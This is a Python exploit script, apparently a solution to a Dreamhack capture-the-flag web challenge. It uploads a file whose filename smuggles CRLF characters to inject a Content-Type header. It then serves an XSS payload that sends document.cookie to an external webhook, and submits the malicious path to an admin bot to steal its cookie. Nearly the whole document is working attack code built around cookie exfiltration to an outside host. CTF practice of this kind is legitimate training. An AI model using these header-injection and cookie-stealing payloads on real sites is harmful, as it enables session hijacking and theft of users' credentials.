import requests
import re
import urllib.parse
import html

# [사용자 설정]
URL = "http://host8.dreamhack.games:23926"
WEBHOOK_URL = "https://webhooksite.net/5c337e9e-4316-4545-983b-ab895c23b065"

def solve():
    print(f"[*] 대상 서버: {URL}")
    print(f"[*] 웹훅 URL: {WEBHOOK_URL}")
    print("-" * 50)

    # 1. 페이로드 설정
    username = "image/png:"
    filename = "%0d%0aContent-Type:text%2fxml;.png"

    # XML 파서가 특수문자를 엄격하게 검사하므로 CDATA를 사용하여 안정성을 높입니다.
    xss_payload = f"""<html xmlns="http://www.w3.org/1999/xhtml">
    <body>
        <script><![CDATA[
            location.href='{WEBHOOK_URL}/?flag='+document.cookie;
        ]]></script>
    </body>
</html>"""

    files = {
        'file': (filename, xss_payload, 'image/png')
    }
    data = {
        'name': username
    }

    print("[*] 1. 페이로드를 업로드합니다...")
    r_upload = requests.post(f"{URL}/upload", data=data, files=files)
    print(f"[*] 업로드 응답 상태 코드: {r_upload.status_code}")
    
    if "Upload success" not in r_upload.text:
        error_msg = re.search(r'<p>(.*?)</p>', r_upload.text)
        print("[-] 업로드 실패! 메시지:", error_msg.group(1) if error_msg else "알 수 없음")
        return
    print("[+] 업로드 성공!")

    # 2. 업로드된 파일의 스토리지 경로 찾기
    # DB에 저장된 username: image%2Fpng%3A
    db_username = urllib.parse.quote(username, safe='')
    
    # Flask의 자동 디코딩을 상쇄하기 위해 한 번 더 인코딩: image%252Fpng%253A
    double_encoded_username = urllib.parse.quote(db_username, safe='')
    storage_url = f"{URL}/{double_encoded_username}"

    print(f"\n[*] 2. UUID를 찾기 위해 스토리지 라우터에 접근합니다...")
    print(f"    - 요청 URL: {storage_url}")
    r_storage = requests.get(storage_url)

    match = re.search(r'href="static/([a-f0-9\-]+)/([^"]+)"', r_storage.text)
    if not match:
        print("[-] UUID를 찾을 수 없습니다. (여전히 정규식 매칭 실패)")
        return

    uuid = match.group(1)
    raw_filename = html.unescape(match.group(2))
    print(f"[+] 발견된 UUID: {uuid}")
    print(f"[*] 서버에 저장된 파일명: {raw_filename}")

    # 3. 악성 경로(Path) 생성
    # Flask 내부에서 unquote 되면서 CRLF가 터지도록 다시 한번 인코딩합니다.
    malicious_filename = urllib.parse.quote(raw_filename)
    malicious_path = f"static/{uuid}/{malicious_filename}"

    print(f"\n[*] 3. 최종 공격 경로(Path):")
    print(f"    - {malicious_path}")

    # 4. Report (관리자 봇에게 URL 전송)
    print(f"\n[*] 4. 관리자 봇(Report)에게 악성 URL을 전송하여 플래그 탈취를 시도합니다...")
    r_report = requests.post(f"{URL}/report", data={'path': malicious_path})

    if "Success" in r_report.text or "success" in r_report.text.lower():
        print("-" * 50)
        print("[🎉 SUCCESS] 관리자 봇이 악성 링크에 정상적으로 접근했습니다!")
        print(f"이제 지정해두신 웹훅({WEBHOOK_URL}) 페이지에서 플래그를 확인해 보세요.")
    else:
        print("[-] 리포트 실패. 서버 상태나 코드를 다시 한 번 확인해주세요.")

if __name__ == "__main__":
    solve()